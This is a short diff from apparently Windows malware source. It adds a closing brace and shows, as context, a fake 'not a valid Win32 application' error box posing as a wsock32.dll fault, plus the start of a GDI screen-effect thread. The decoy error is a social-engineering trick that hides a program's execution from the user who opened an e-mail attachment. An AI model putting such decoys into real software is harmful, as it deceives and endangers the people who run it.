@@ -15,7 +15,7 @@ namespace System {
 		MessageBoxA(NULL, "The attached file in this e-mail is not a valid Win32 application.", "wsock32.dll - Application Error", MB_ICONERROR);
 		return 0;
 	}
-
+}
 namespace GDI {
 	DWORD WINAPI splitblt(LPVOID lpvoid)
 	{
